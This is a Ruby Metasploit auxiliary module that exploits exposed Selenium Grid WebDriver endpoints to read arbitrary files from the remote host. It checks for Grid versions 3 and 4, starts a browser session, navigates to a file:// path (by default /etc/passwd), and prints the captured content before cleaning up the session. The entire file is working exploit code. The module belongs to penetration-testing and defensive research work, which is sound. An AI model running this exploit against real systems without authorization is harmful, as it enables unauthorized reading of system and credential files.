##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  # This compatibility prefix is supported by both Grid 3 and Grid 4, including cleanup.
  WEBDRIVER_SESSION_PATH = 'wd/hub/session'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Selenium arbitrary file read',
        'Description' => %q{
          If there is an open selenium web driver, a remote attacker can send requests to the victims browser.
          In certain cases this can be used to access to the remote file system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jon Stratton',     # Original Metasploit module
          'Takahiro Yokoyama' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
        'Platform' => 'misc',
        'Targets' => [
          [
            'Native Payload', {
              'Platform' => %w[linux osx win unix],
              'Arch' => ARCH_ALL
            }
          ]
        ],
        'DisclosureDate' => '2020-10-01', # Not sure this is correct
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(4444),
        OptString.new('SCHEME', [true, 'The scheme to use', 'file']),
        OptString.new('FILEPATH', [true, 'File to read', '/etc/passwd']),
        OptEnum.new('BROWSER', [true, 'The browser to use', 'firefox', ['firefox', 'chrome', 'MicrosoftEdge']]),
        OptInt.new('TIMEOUT', [ true, 'Timeout for exploit (seconds)', 75 ]),
      ]
    )
  end

  def check
    # Request for Selenium Grid version 4
    v4res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'status')
    })
    if v4res && v4res.get_json_document && v4res.get_json_document.include?('value') &&
       v4res.get_json_document['value'].include?('message')
      if v4res.get_json_document['value']['message'] == 'Selenium Grid ready.'
        return Exploit::CheckCode::Detected('Selenium Grid version 4.x detected and ready.')
      elsif v4res.get_json_document['value']['message'].downcase.include?('selenium grid')
        return Exploit::CheckCode::Unknown('Selenium Grid version 4.x detected but not ready.')
      end
    end

    # Request for Selenium Grid version 3
    v3res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown('Unexpected server reply.') unless v3res&.code == 200

    js_code = v3res.get_html_document.css('script').find { |script| script.text.match(/var json = Object.freeze\('(.*?)'\);/) }
    return Exploit::CheckCode::Unknown('Unable to determine the version.') unless js_code

    json_str = js_code.text.match(/var json = Object.freeze\('(.*?)'\);/)[1]
    begin
      json_data = JSON.parse(json_str)
    rescue JSON::ParserError
      return Exploit::CheckCode::Unknown('Unable to determine the version.')
    end
    return Exploit::CheckCode::Unknown('Unable to determine the version.') unless json_data && json_data.include?('version') && json_data['version']

    # Extract the version
    version = Rex::Version.new(json_data['version'])
    Exploit::CheckCode::Appears("Version #{version} detected")
  end

  def run
    case datastore['BROWSER']
    when 'firefox'
      options = 'moz:firefoxOptions'
    when 'chrome'
      options = 'goog:chromeOptions'
    when 'MicrosoftEdge'
      options = 'ms:edgeOptions'
    end
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH),
      'ctype' => 'application/json; charset=utf-8',
      'data' => JSON.generate({
        desiredCapabilities: { browserName: datastore['BROWSER'] },
        capabilities: {
          firstMatch: [
            {
              browserName: datastore['BROWSER'],
              "#{options}": {}
            }
          ]
        }
      })
    }, datastore['TIMEOUT'])
    document = webdriver_document(res, 'Failed to start browser session')
    session_id = document['value']['sessionId'] if document['value'].is_a?(Hash)
    session_id ||= document['sessionId']
    unless session_id.is_a?(String) && session_id.present?
      fail_with(Failure::UnexpectedReply, 'Failed to start browser session: WebDriver did not return a session ID')
    end

    begin
      print_status("Started session (#{session_id}).")
      url = "#{datastore['SCHEME']}://#{datastore['FILEPATH']}"
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id, 'url'),
        'ctype' => 'application/json; charset=utf-8',
        'data' => JSON.generate({ url: url })
      })
      webdriver_document(res, "Failed to navigate browser to #{url}")

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id, 'source'),
        'ctype' => 'application/json; charset=utf-8'
      })
      document = webdriver_document(res, "Failed to read file #{datastore['FILEPATH']}")
      unless document['value'].is_a?(String)
        fail_with(Failure::UnexpectedReply, "Failed to read file #{datastore['FILEPATH']}: WebDriver did not return page source")
      end

      file_content = Nokogiri::HTML(document['value']).at('pre')
      unless file_content
        fail_with(Failure::UnexpectedReply, "Failed to read file #{datastore['FILEPATH']}: Browser did not return a text file")
      end

      print_good("#{datastore['FILEPATH']}\n#{file_content.text}")
    ensure
      delete_browser_session(session_id)
    end
  end

  private

  def webdriver_document(response, operation)
    document = response.get_json_document if response&.code == 200
    error = webdriver_response_error(response, document)
    fail_with(response ? Failure::UnexpectedReply : Failure::Unreachable, "#{operation}: #{error}") if error

    document
  end

  # Cleanup uses the same validation without raising over an earlier file error.
  def webdriver_response_error(response, document)
    return 'Target did not respond' unless response
    return "HTTP #{response.code}" unless response.code == 200
    return 'Invalid WebDriver JSON response' unless document.is_a?(Hash) && document.key?('value')
    return 'WebDriver reported an error' if document.key?('status') && document['status'] != 0
    return 'WebDriver reported an error' if document['value'].is_a?(Hash) && document['value'].key?('error')

    nil
  end

  def delete_browser_session(session_id)
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id),
      'headers' => { 'Content-Type' => 'application/json; charset=utf-8' }
    })
    document = res.get_json_document if res&.code == 200
    error = webdriver_response_error(res, document)
    if error
      print_warning("Failed to delete browser session (#{session_id}): #{error}. The session may need to be deleted manually.")
    else
      print_status("Deleted session (#{session_id}).")
    end
  rescue Rex::ConnectionError, Rex::TimeoutError, ::Timeout::Error => e
    elog('Browser session cleanup failed', error: e)
    print_warning("Failed to delete browser session (#{session_id}): #{e.message}")
  end
end
